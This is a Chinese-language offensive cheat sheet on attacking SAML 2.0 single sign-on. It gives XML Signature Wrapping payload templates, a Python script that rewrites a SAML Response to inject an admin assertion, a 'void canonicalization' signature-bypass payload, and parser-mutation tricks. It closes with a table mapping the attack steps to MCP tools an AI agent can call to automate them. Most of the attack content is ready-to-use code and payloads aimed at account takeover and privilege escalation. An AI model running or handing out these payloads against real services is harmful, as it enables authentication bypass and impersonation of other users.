# SAML 2.0 攻击

## XML Signature Wrapping (XSW)

SAML 断言用 XML 签名保护。签名验证和业务逻辑用**不同的 XML 解析器**，攻击者利用解析差异注入越权断言。

```python
# XSW 攻击脚本 — 示例 payload 模板
XSW_PAYLOADS = [
    # XSW1: 在合法 Assertion 外层包裹恶意 Assertion
    # 签名验证读内层(合法)，业务逻辑读外层(恶意)
    '''<?xml version="1.0"?>
    <Response>
      <Assertion ID="evil">  <!-- 外层: 业务逻辑读到这个 -->
        <Subject><NameID>admin@target.com</NameID></Subject>
        <AttributeStatement>
          <Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>
        </AttributeStatement>
      </Assertion>
      <ds:Signature>
        <ds:SignedInfo><ds:Reference URI="#legit"/></ds:SignedInfo>
        <ds:SignatureValue>...</ds:SignatureValue>
      </ds:Signature>
      <Assertion ID="legit">  <!-- 内层: 签名验证这个 -->
        <Subject><NameID>user@target.com</NameID></Subject>
      </Assertion>
    </Response>''',

    # XSW2: Signature 外置 — 签名在 Response 级别
    # 验证 Response 签名 → 读里面的 Assertion → 攻击者注入第二个 Assertion

    # XSW8: 嵌套 Reference — 签名指向 outer Assertion
    # 但解析器取的是直接 child
]
```

### 利用脚本

```python
# saml_xsw.py — 拦截并修改 SAML Response
import requests, base64, zlib
from urllib.parse import unquote, quote

def intercept_and_wrap(saml_response: str, target_subject: str):
    """修改 SAML Response 中的用户身份"""
    # Step 1: 解码 SAML Response (Base64 → XML)
    decoded = base64.b64decode(unquote(saml_response)).decode()

    # Step 2: 注入恶意 Assertion (XSW1 模式)
    # 在根 Response 下插入我们的 Assertion
    malicious_assertion = f'''
    <saml:Assertion ID="evil" IssueInstant="2026-01-01T00:00:00Z" Version="2.0">
      <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
          {target_subject}
        </saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
            Recipient="https://sp.target.com/acs"/>
        </saml:SubjectConfirmation>
      </saml:Subject>
      <saml:AttributeStatement>
        <saml:Attribute Name="role">
          <saml:AttributeValue>admin</saml:AttributeValue>
        </saml:Attribute>
      </saml:AttributeStatement>
    </saml:Assertion>'''

    # 注入到 Response 第一个位置
    poisoned = decoded.replace("</saml:Response>",
        malicious_assertion + "\n</saml:Response>", 1)

    # Step 3: 重编码
    return quote(base64.b64encode(poisoned.encode()).decode())
```

## Void Canonicalization

```python
# 2025年发现: 当 XML canonicalization 遇到错误(如相对 namespace URI)
# libxml2 返回空字符串而不是报错
# 摘要计算: SHA256("") = 47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=
# → 只需让签名引用一个 canonicalization 出错的元素
# → 摘要永远等于这个已知值 → 注入任意断言

VOID_NAMESPACE_PAYLOAD = '''<?xml version="1.0"?>
<Response xmlns:ns="1">  <!-- 相对 URI → canonicalization error → 空字符串 -->
  <Assertion ID="evil">
    <Subject><NameID>admin@evil.com</NameID></Subject>
  </Assertion>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:Reference URI="#evil">  <!-- 引用 evil 断言 -->
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <!-- DigestValue = hash("") = 已知值 -->
        <ds:DigestValue>47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>任意值</ds:SignatureValue>
  </ds:Signature>
</Response>'''
```

## Round-Trip 攻击

```python
# 利用 XML 序列化→反序列化过程中的 parser 差异
# REXML vs Nokogiri (Ruby): CDATA、namespace prefix、注释的处理不同

ROUNDTRIP_MUTATIONS = [
    # CDATA 拆分
    ("NameID", '<![CDATA[user@t]]><![CDATA[arget.com]]'),
    # 多余注释注入 (不同解析器处理注释位置不同)
    ("Assertion", "<!-- --><Assertion ID='evil'>..."),
    # Namespace prefix 变更
    ('xmlns:ds="..."', 'xmlns:dsig="..."'),
]
```

## SAML 测试工具

```bash
# SAMLRaider (Burp 插件) — SAML 断言可视化编辑
# SAML Encoder/Decoder — 编解码 SAML Request/Response
# saml2aws — AWS SAML 集成测试

# 手动解码
echo "$SAML_RESPONSE" | python3 -c "
import sys,base64,zlib
data=base64.b64decode(sys.stdin.read())
print(data.decode())
"

# 拦截 SAML 流量 — Burp Proxy → Proxy → HTTP History → filter for SAML
```

## 攻击链

```
SAML XSW → 注入 admin Assertion → SP 读到 admin 身份 → 后台访问
Void Canonicalization → 完全绕过签名验证 → 任意 SAML 断言 → 任意用户
SAML → 修改 NameID → 切换到目标用户 → 账户接管
SAML → Attribute 注入 → role=admin → 垂直提权
SAML Response Replay → 过期/重用 → 重放攻击
```

## Evidence

记录: 原始 SAML Response (Base64)、解码后的 XML、注入的恶意 Assertion、签名验证结果、最终 SP 接受的用户身份

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| SAML endpoint 探测 | `http_probe` | HTTP GET 探测 SAML SSO 端点 |
| 知识检索 | `kb_router` | 按攻击信号搜索知识库相关技术 |
